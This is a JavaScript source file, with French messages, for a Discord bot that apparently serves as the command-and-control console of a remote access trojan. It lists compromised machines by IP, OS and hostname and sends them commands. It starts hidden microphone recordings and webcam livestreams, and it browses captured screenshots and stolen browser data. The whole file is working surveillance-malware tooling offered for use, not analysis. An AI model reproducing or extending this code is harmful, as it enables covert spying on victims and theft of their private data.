import {ActionRowBuilder, ButtonBuilder} from "discord.js";
import {commands} from "../commands.js";
import {executeRequestWithTokenRefresh} from "./token.js";
import {createEmbed} from "./utils.js";
import config from "../static/config.json" assert {type: 'json'};
const {API_BASE_URL} = config;

export const handleHelpCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    const embed = createEmbed('Aide', 'Voici la liste des commandes disponibles :', commands.map(command => ({
        name: `/${command.name}`,
        value: command.description,
    })));
    await interaction.editReply({ embeds: [embed] });
};

export const handleClientsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });

    const statusFilter = interaction.options.getString('status');
    const url = `${API_BASE_URL}/clients/${statusFilter ? `?status=${statusFilter}` : ''}`;

    try {
        const response = await executeRequestWithTokenRefresh(url);
        const clients = response.data;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }
        const embeds = clients.map(client => createEmbed(`Client ${client.id || 'Client sans nom'} / ${client.ip}`,
            `**OS :** ${client.os}\n` +
            `**Version :** ${client.os_version}\n` +
            `**Hostname :** ${client.hostname}\n` +
            `**Créé le :** ${client.date_created}\n` +
            `**Mis à jour le :** ${client.date_updated}\n` +
            `**Statut :** ${client.status.toUpperCase()}`,
            [],
            client.status === 'online' ? '#00FF00' : '#FF0000'
        ));

        await interaction.editReply({ embeds });
    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
};

export const handleSendCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    const command = interaction.options.getString('command');
    const duration = interaction.options.getInteger('duration') || 10;

    await interaction.deferReply({ ephemeral: true });

    const url = `${API_BASE_URL}/command/${clientId}`;
    let data = {
        command: command
    };

    if (command === 'microphone' && duration) {
        data.params = { duration };
    } else if (command === 'microphone' && !duration) {
        await interaction.editReply("Veuillez spécifier une durée pour l'enregistrement audio.");
        return;
    }

    try {
        await executeRequestWithTokenRefresh(url, { method: 'POST', data });
        if (command === 'microphone') {
            await interaction.editReply(`Démarrage de l'enregistrement audio pour le client ${clientId} pour ${duration} secondes...`);
            let elapsedSeconds = 0;
            const intervalId = setInterval(async () => {
                elapsedSeconds++;
                const percentage = Math.min((elapsedSeconds / duration) * 100, 100).toFixed(0);
                await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
                if (elapsedSeconds >= duration) {
                    clearInterval(intervalId);
                    await interaction.editReply(`Enregistrement audio terminé pour le client ${clientId}.`);
                }
            }, 1000);
        } else {
            await interaction.editReply(`Commande '${command}' envoyée au client ${clientId}.`);
        }
    } catch (error) {
        if (error.response.data.message.includes("hors ligne")) {
            await interaction.editReply("Le client est hors ligne.");
        } else {
            console.error("Erreur lors de l'envoi de la commande", error);
            await interaction.editReply("Erreur lors de l'envoi de la commande.");
        }
    }
};

export const handleLivestreamCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    await interaction.deferReply({ ephemeral: true });

    const url = `${API_BASE_URL}/webcam/link/${clientId}`;
    const url_webcam = `${API_BASE_URL}/webcam/${clientId}`;
    try {
        await executeRequestWithTokenRefresh(url, { method: 'GET' });
        await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} démarrée : ${url_webcam}`);
    } catch (error) {
        if (error.response.data.message.includes("hors ligne")) {
            await interaction.editReply("Le client est hors ligne.");
        } else {
            console.error("Erreur lors du démarrage de la diffusion en direct", error);
            await interaction.editReply("Erreur lors du démarrage de la diffusion en direct.");
        }
    }
}

export const handleListDataCommand = async (interaction) => {
    const type = interaction.options.getString('type');
    const browser = interaction.options.getString('browser') || null;
    await interaction.deferReply({ ephemeral: true });

    try {
        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients/`);
        const clients = response.data;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }

        const buttons = clients.map(client =>
            new ButtonBuilder()
                .setCustomId(`${type}_${client.id}_${browser}`)
                .setLabel(`Client ${client.id || 'Client sans nom'} / ${client.ip}`)
                .setStyle(1)
        );

        const components = [];
        for (let i = 0; i < buttons.length; i += 5) {
            const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
            components.push(actionRow);
        }

        let content = '';
        switch (type) {
            case 'screenshot':
                content = "Sélectionnez un client pour voir les captures d'écran :";
                break;
            case 'microphone':
                content = "Sélectionnez un client pour voir les enregistrements audio :";
                break;
            case 'browserdata':
                content = "Sélectionnez un client pour voir les données de navigation :";
                break;
        }

        await interaction.editReply({content, components});

    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
}